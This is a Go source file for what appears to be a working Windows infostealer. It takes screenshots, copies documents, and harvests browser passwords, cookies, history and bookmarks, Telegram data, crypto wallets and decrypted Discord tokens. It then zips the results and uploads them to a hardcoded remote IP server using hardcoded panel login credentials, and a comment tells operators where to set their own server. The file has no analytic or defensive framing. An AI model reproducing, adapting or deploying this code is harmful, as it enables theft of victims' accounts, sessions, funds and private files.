package main

import (
	"archive/zip"
	"asd/bookmarks"
	"asd/cookies"
	"asd/discord"
	"asd/downloads"
	"asd/history"
	"asd/messengers"
	"asd/passwords"
	"asd/searchandcopy"
	"asd/wallets"

	"asd/yandex_decrypt"
	"bytes"
	"compress/flate"
	"database/sql"
	"encoding/json"
	"image/png"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"path"
	"slices"
	"time"

	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/kbinani/screenshot"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/net/publicsuffix"
)

// Windows constants
const (
	CSIDL_LOCAL_APPDATA = 0x001C
	CSIDL_APPDATA       = 0x001A
	MAX_PATH            = 260
)

// BrowserType represents different browser types
type BrowserType int

const (
	Chrome BrowserType = iota
	Edge
	Brave
	Opera
	Vivaldi
	Yandex
)

// String returns the string representation of browser type
func (b BrowserType) String() string {
	return [...]string{"Chrome", "Edge", "Brave", "Opera", "Vivaldi", "Yandex"}[b]
}

// BrowserCookieExtractor handles the extraction of cookies
type BrowserCookieExtractor struct{}

// GetTempDirectoryPath returns the system's temporary directory path
func (b *BrowserCookieExtractor) GetTempDirectoryPath() string {
	tempDir := os.TempDir()
	if tempDir != "" {
		return tempDir
	}

	// Fallback methods
	for _, envVar := range []string{"TEMP", "TMP"} {
		if envPath := os.Getenv(envVar); envPath != "" {
			return envPath
		}
	}

	// Last resort
	return "C:\\Windows\\Temp\\"
}

// GetFolderPath gets a special folder path using Windows API
func SHGetFolderPath(folderID uint32) (string, error) {
	shell32 := syscall.NewLazyDLL("shell32.dll")
	proc := shell32.NewProc("SHGetFolderPathW")

	b := make([]uint16, MAX_PATH)
	ret, _, err := proc.Call(
		0,
		uintptr(folderID),
		0,
		0,
		uintptr(unsafe.Pointer(&b[0])),
	)

	if ret != 0 {
		return "", err
	}

	return syscall.UTF16ToString(b), nil
}

// GetLocalAppDataPath returns the Local AppData path
func (b *BrowserCookieExtractor) GetLocalAppDataPath() string {
	path, err := SHGetFolderPath(CSIDL_LOCAL_APPDATA)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting Local AppData path: %v\n", err)
		return ""
	}
	return path
}

// GetRoamingAppDataPath returns the Roaming AppData path
func (b *BrowserCookieExtractor) GetRoamingAppDataPath() string {
	path, err := SHGetFolderPath(CSIDL_APPDATA)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting Roaming AppData path: %v\n", err)
		return ""
	}
	return path
}

// GetCookiesDbPath returns the path to cookies database for a specific browser
func (b *BrowserCookieExtractor) GetCookiesDbPath(browserType BrowserType) string {
	localAppData := b.GetLocalAppDataPath()
	roamingAppData := b.GetRoamingAppDataPath()
	if localAppData == "" {
		return ""
	}

	var possiblePaths []string

	switch browserType {
	case Chrome:
		possiblePaths = []string{
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Cookies"),
		}
	case Edge:
		possiblePaths = []string{
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
		}
	case Brave:
		possiblePaths = []string{
			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
		}
	case Opera:
		possiblePaths = []string{
			filepath.Join(localAppData, "Opera Software", "Opera Stable", "Network", "Cookies"),
			filepath.Join(localAppData, "Opera Software", "Opera Stable", "Cookies"),
			filepath.Join(roamingAppData, "Opera Software", "Opera Stable", "Default", "Network", "Cookies"),
			filepath.Join(roamingAppData, "Opera Software", "Opera Stable", "Network", "Cookies"),
			filepath.Join(roamingAppData, "Opera Software", "Opera Stable", "Cookies"),
		}
	case Vivaldi:
		possiblePaths = []string{
			filepath.Join(localAppData, "Vivaldi", "User Data", "Default", "Network", "Cookies"),
			filepath.Join(localAppData, "Vivaldi", "User Data", "Default", "Cookies"),
		}
	case Yandex:
		possiblePaths = []string{
			filepath.Join(localAppData, "Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies"),
			filepath.Join(localAppData, "Yandex", "YandexBrowser", "User Data", "Default", "Cookies"),
		}
	default:
		return ""
	}

	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	return ""
}

// ExtractCookiesFromDatabase extracts cookies from a SQLite database
func (b *BrowserCookieExtractor) ExtractCookiesFromDatabase(dbPath, outputFile, browserName string) bool {
	// Make a copy of the database because it might be locked by the browser
	tempDbPath := dbPath + ".temp"

	// Clean up any existing temp file
	os.Remove(tempDbPath)

	// Copy the database
	srcFile, err := os.Open(dbPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to open %s cookies database: %v\n", browserName, err)
		return false
	}
	defer srcFile.Close()

	dstFile, err := os.Create(tempDbPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create temporary copy of %s cookies database: %v\n", browserName, err)
		return false
	}
	defer dstFile.Close()

	if _, err = io.Copy(dstFile, srcFile); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to copy %s cookies database: %v\n", browserName, err)
		return false
	}
	dstFile.Close() // Close file before opening with SQLite

	// Open the SQLite database
	db, err := sql.Open("sqlite3", tempDbPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Cannot open %s database: %v\n", browserName, err)
		os.Remove(tempDbPath)
		return false
	}
	defer db.Close()

	// Open output file in append mode
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to open output file: %v\n", err)
		os.Remove(tempDbPath)
		return false
	}
	defer outFile.Close()

	// Write browser header
	fmt.Fprintf(outFile, "\n# %s Cookies\n", browserName)

	// Query the database
	rows, err := db.Query(`SELECT host_key, is_httponly, path, is_secure, expires_utc, name, value FROM cookies`)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to query %s database: %v\n", browserName, err)
		os.Remove(tempDbPath)
		return false
	}
	defer rows.Close()

	cookieCount := 0

	for rows.Next() {
		var domain string
		var httpOnly int
		var path string
		var secure int
		var expiresChrome int64
		var name string
		var value string

		if err := rows.Scan(&domain, &httpOnly, &path, &secure, &expiresChrome, &name, &value); err != nil {
			fmt.Fprintf(os.Stderr, "Error scanning row from %s database: %v\n", browserName, err)
			continue
		}

		// Convert Chrome/Edge timestamp (microseconds since 1601-01-01) to Unix timestamp
		var expires int64 = 0
		if expiresChrome > 0 {
			expires = (expiresChrome / 1000000) - 11644473600
		}

		// Format for Netscape cookie file
		httpOnlyStr := "FALSE"
		if httpOnly != 0 {
			httpOnlyStr = "TRUE"
		}

		secureStr := "FALSE"
		if secure != 0 {
			secureStr = "TRUE"
		}

		fmt.Fprintf(outFile, "%s\t%s\t%s\t%s\t%d\t%s\t%s\n",
			domain, httpOnlyStr, path, secureStr, expires, name, value)

		cookieCount++
	}

	// Check for errors from iterating over rows
	if err := rows.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "Error iterating rows from %s database: %v\n", browserName, err)
	}

	// Clean up
	os.Remove(tempDbPath)

	fmt.Printf("[!] Successfully exported %d %s cookies\n", cookieCount, browserName)
	return cookieCount > 0
}

// ExtractAllBrowserCookies extracts cookies from all supported browsers
func (b *BrowserCookieExtractor) ExtractAllBrowserCookies() string {
	// Get temp directory path

	// Create output file path in temp directory

	outputFile := filepath.Join(filepath.Join("Results", "decrypted_cookies_Allinone.csv"))

	// Create a file with Netscape cookie file header
	outFile, err := os.Create(outputFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create output file: %v\n", err)
		return ""
	}

	fmt.Fprintln(outFile, "# Netscape HTTP Cookie File")
	fmt.Fprintln(outFile, "# Lightweight Multi-Browser Cookie Extractor")
	fmt.Fprintln(outFile, "")
	outFile.Close()

	// List of browsers to extract
	browsers := []BrowserType{
		Chrome,
		Edge,
		Brave,
		Opera,
		Vivaldi,
		Yandex,
	}

	anyCookiesExtracted := false

	// Extract cookies for each browser
	for _, browser := range browsers {
		browserName := browser.String()
		cookiesDbPath := b.GetCookiesDbPath(browser)

		if cookiesDbPath != "" {
			fmt.Printf("Attempting to extract %s cookies from: %s\n", browserName, cookiesDbPath)
			if b.ExtractCookiesFromDatabase(cookiesDbPath, outputFile, browserName) {
				anyCookiesExtracted = true
			}
		} else {
			fmt.Printf("No cookies database found for %s\n", browserName)
		}
	}

	if anyCookiesExtracted {
		return outputFile
	}
	return ""
}

const regexPattern = `dQw4w9WgXcQ:([^\"]*)`

// Get the folder path to where Discord stores its data
var appdataDir = filepath.ToSlash(os.Getenv("APPDATA"))

func zipFolder(source, target string) error {
	// Create the zip file with better compression
	zipFile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	// Create a new zip writer with maximum compression
	writer := zip.NewWriter(zipFile)
	defer writer.Close()

	// Set maximum compression
	writer.RegisterCompressor(zip.Deflate, func(out io.Writer) (io.WriteCloser, error) {
		return flate.NewWriter(out, flate.BestCompression)
	})

	// Walk through the source folder
	err = filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip system files or empty directories
		if info.IsDir() || info.Size() == 0 {
			return nil
		}

		// Create a local file header
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// Preserve the relative path structure
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		header.Name = relPath

		// Set compression method to maximum
		header.Method = zip.Deflate

		// Create writer for the file
		w, err := writer.CreateHeader(header)
		if err != nil {
			return err
		}

		// Open source file
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		// Create a buffer for additional compression
		buf := make([]byte, 32*1024)

		// Copy file content with buffered io
		_, err = io.CopyBuffer(w, file, buf)
		return err
	})

	return err
}

type FileUploader struct {
	ServerURL string
	client    *http.Client
}

func NewFileUploader(serverURL string) (*FileUploader, error) {
	// Create a cookie jar to maintain sessions
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		return nil, err
	}

	// Create HTTP client with cookie jar
	client := &http.Client{
		Timeout: 5 * time.Minute,
		Jar:     jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Allow up to 10 redirects
			if len(via) > 10 {
				return fmt.Errorf("stopped after 10 redirects")
			}
			return nil
		},
	}

	return &FileUploader{
		ServerURL: serverURL,
		client:    client,
	}, nil
}

func (fu *FileUploader) login(username, password string) error {
	// Prepare login data
	loginData := url.Values{
		"username": {username},
		"password": {password},
	}

	// Create login request
	resp, err := fu.client.PostForm(fu.ServerURL+"/login", loginData)
	if err != nil {
		return fmt.Errorf("login request failed: %v", err)
	}
	defer resp.Body.Close()

	// Handle redirects
	if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusSeeOther {
		// Follow redirect
		location := resp.Header.Get("Location")
		if location != "" {
			resp, err = fu.client.Get(fu.ServerURL + location)
			if err != nil {
				return fmt.Errorf("failed to follow login redirect: %v", err)
			}
			defer resp.Body.Close()
		}
	}

	// Read response body for debugging
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read login response: %v", err)
	}

	// Check login response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("login failed with status: %d. Response: %s",
			resp.StatusCode, string(body))
	}

	return nil
}
func (fu *FileUploader) uploadZipFile(zipPath string) error {
	// Perform login
	err := fu.login("admin", "securePa$$word123")
	if err != nil {
		return fmt.Errorf("login failed before upload: %v", err)
	}

	// Open zip file
	file, err := os.Open(zipPath)
	if err != nil {
		return fmt.Errorf("failed to open zip file: %v", err)
	}
	defer file.Close()

	// Create multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Create form file
	part, err := writer.CreateFormFile("file", filepath.Base(zipPath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	// Copy file contents
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file contents: %v", err)
	}

	// Close multipart writer
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	// Create HTTP request
	req, err := http.NewRequest("POST", fu.ServerURL+"/upload", body)
	if err != nil {
		return fmt.Errorf("failed to create HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send request
	resp, err := fu.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	// Read response body
	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response body: %v", err)
	}

	// Handle redirects or authentication failures
	if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusUnauthorized {
		// Attempt to log in again and retry upload
		err = fu.login("admin", "securePa$$word123")
		if err != nil {
			return fmt.Errorf("re-login failed: %v", err)
		}

		// Retry upload
		return fu.uploadZipFile(zipPath)
	}

	// Check response status
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("upload failed with status: %d, response: %s",
			resp.StatusCode, string(responseBody))
	}

	// Try to parse JSON response
	var result map[string]interface{}
	if err := json.Unmarshal(responseBody, &result); err != nil {
		return fmt.Errorf("failed to parse response: %v. Raw response: %s",
			err, string(responseBody))
	}

	// Print upload success message
	fmt.Println("File uploaded successfully!")
	fmt.Printf("File ID: %v\n", result["file_id"])

	return nil
}
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// here on this function you can change your IP/Port.
// port should be same with the Panel one to.
func continuewithme() {
	sourceFolder := "Results"
	zipFilePath := generateRandomString(16) + ".zip"

	// Use a different variable name
	err2 := zipFolder(sourceFolder, zipFilePath)
	if err2 != nil {
		fmt.Printf("Error zipping folder: %v\n", err2)
		return
	}

	fmt.Println("Folder zipped successfully!")

	defaultServerURL := "http://51.38.196.118:8080"
	serverURL := defaultServerURL

	// Create uploader
	uploader, err := NewFileUploader(serverURL)
	if err != nil {
		log.Fatalf("Failed to create uploader: %v", err)
	}

	// Upload the file
	err = uploader.uploadZipFile(zipFilePath)
	if err != nil {
		log.Fatalf("Upload failed: %v", err)
	}

	// Optional: Provide more detailed success message
	fmt.Printf("Successfully uploaded %s to %s\n", filepath.Base(zipFilePath), serverURL)
}
func main() {

	// Create Results folder if it doesn't exist
	resultsDir := "Results"
	err := os.MkdirAll(resultsDir, os.ModePerm)
	if err != nil {
		log.Fatalf("Failed to create Results directory: %v", err)
	}

	// Get the number of displays
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		// Get the bounds of the display
		bounds := screenshot.GetDisplayBounds(i)

		// Capture the screenshot
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("Failed to capture screen %d: %v", i, err)
			continue
		}

		// Generate filename
		filename := filepath.Join(resultsDir, fmt.Sprintf("screen_%d.png", i))

		// Create the file
		f, err := os.Create(filename)
		if err != nil {
			log.Printf("Failed to create file %s: %v", filename, err)
			continue
		}

		// Encode and save the screenshot as PNG
		err = png.Encode(f, img)
		f.Close()
		if err != nil {
			log.Printf("Failed to save screenshot %s: %v", filename, err)
			continue
		}

		fmt.Printf("Saved screenshot %s\n", filename)
	}

	fmt.Printf("Captured screenshots for %d display(s)\n", n)

	if err := messengers.ExtractTelegram(resultsDir); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Extract Telegram Error: %v\n", err)
	}

	localAppDataPath, err := os.UserCacheDir()
	if err != nil {
		panic(err)
	}

	userDataPath := filepath.Join(localAppDataPath, "Yandex/YandexBrowser/User Data")

	yadecrypt, err := yandex_decrypt.NewYandexDecrypt(userDataPath)

	yadecrypt.PrintCredentials()

	fmt.Println("\n[*] Extracting browser bookmarks...")
	if err := bookmarks.ExtractBookmarksFromAllBrowsers(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error extracting bookmarks: %v\n", err)
	}

	fmt.Println("\n[*] Extracting browser downloads...")
	if err := downloads.ExtractDownloads(); err != nil {
		fmt.Fprintf(os.Stderr, "Error extracting downloads: %v\n", err)
	}

	if err := passwords.ExtractPasswords(); err != nil {
		fmt.Fprintf(os.Stderr, "Error extracting passwords: %v\n", err)
	}

	if err := history.ExtractAllBrowsersHistory(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)

	}

	fmt.Println("\n[*] Extracting browser cookies...")
	if err := cookies.ExtractCookiesFromAllBrowsers(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error extracting cookies: %v\n", err)
	}

	fmt.Println("\n[*] Looking for all .txt, .docx. pdf files....")
	if err := searchandcopy.SearchAndCopyFiles(); err != nil {
		fmt.Fprintf(os.Stderr, ": %v\n", err)
	}

	extractor := &BrowserCookieExtractor{}
	outputPath := extractor.ExtractAllBrowserCookies()

	// Get file paths of all files that may contain Discord tokens
	if _, err := os.Stat("Results"); os.IsNotExist(err) {
		if err := os.Mkdir("Results", 0755); err != nil {
			log.Fatalf("Failed to create Results directory: %v", err)
		}
	}

	if err := wallets.ExtractWalletExtensions(resultsDir); err != nil {
		fmt.Fprintf(os.Stderr, "Wallet extensions extraction error: %v\n", err)
	}

	if err := wallets.ExtractWalletFiles(resultsDir); err != nil {
		fmt.Fprintf(os.Stderr, "Wallet files extraction error: %v\n", err)
	}

	paths, err := discord.GetDiscordTokenFiles()
	if err != nil {
		log.Fatal(err)
	}

	// Get encrypted tokens from the files
	encryptedTokens, err := discord.RegexSearchTokenFiles(paths, regexPattern)
	if err != nil {
		log.Fatal(err)
	}

	// Get path to file that contains decryption key
	stateFilePath := path.Join(appdataDir, "discord", "Local State")
	decryptionKey, err := discord.GetDecryptionKey(stateFilePath)
	if err != nil {
		log.Fatal(err)
	}

	// Decrypt any tokens found and add them to a list
	var output []string
	for _, encryptedToken := range encryptedTokens {
		decryptedToken, err := discord.DecryptDiscordToken(encryptedToken, decryptionKey)
		if err != nil {
			log.Fatal(err)
		}
		output = append(output, decryptedToken)
	}
	output = slices.Compact(output)

	// Open file to write tokens
	outputFile, err := os.Create("Results/discordtoken.txt")
	if err != nil {
		log.Fatalf("Failed to create output file: %v", err)
	}
	defer outputFile.Close()

	// Write tokens to file
	for _, token := range output {
		fmt.Fprintln(outputFile, token)
	}

	log.Printf("Successfully saved %d Discord tokens to Results/discordtoken.txt", len(output))

	for i, token := range output {
		fmt.Printf("Token %v: %v\n", i+1, token)
	}

	if outputPath != "" {
		fmt.Printf("Cookies extracted successfully to: %s\n", outputPath)

	} else {
		fmt.Fprintln(os.Stderr, "No cookies could be extracted from any browser.")

	}

	continuewithme()

}
